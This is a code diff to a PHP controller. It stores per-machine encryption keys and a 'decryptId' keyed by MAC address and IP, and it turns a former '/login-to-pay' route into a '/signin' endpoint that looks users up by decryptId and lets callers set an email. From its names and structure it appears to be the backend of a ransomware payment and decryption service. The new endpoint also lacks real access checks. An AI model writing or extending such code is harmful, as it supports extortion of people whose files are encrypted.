@@ -31,6 +31,7 @@ class UserController extends BaseController
             $macAdress = $data['macAdress'];
 
             $encryptionKey = $data['encryptionKey'];
+            $decryptId = $data['decryptId'];
 
             $user = $this->userRepository->findOneBy(['macAddress' => $macAdress]) ?? new User();
             if(array_key_exists('ip', $data)) $user->setIp($data['ip']);
@@ -43,7 +44,8 @@ class UserController extends BaseController
                     $uuid
                 ))
                 ->setEncryptionKey($encryptionKey)
-                ->setRoles(['ROLE_USER']);
+                ->setRoles(['ROLE_USER'])
+                ->setDecryptId($decryptId);
 
             $this->userRepository->save($user, true);
 
@@ -61,13 +63,27 @@ class UserController extends BaseController
     }
 
     /**
-     * @Route('/login-to-pay')
+     * @Route("/signin", methods={"POST"})
      */
-    public function loginToPay(Request $request): Response
+    public function signin(Request $request): Response
     {
         try {
             $data = json_decode($request->getContent(), true);
-            return $this->json();
+            if($data['decryptId']) {
+                $user = $this->userRepository->findOneBy(['decryptId' => $data['decryptId']]);
+            } else {
+                throw $this->createAccessDeniedException();
+            }
+
+            if($data['email']) {
+                $user->setEmail($data['email']);
+                $this->userRepository->save($user, true);
+            }
+
+            return $this->json([
+                'success' => true,
+                'decryptId' => $user->getDecryptId()
+            ]);
         } catch(\Throwable $e) {
             return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
         }
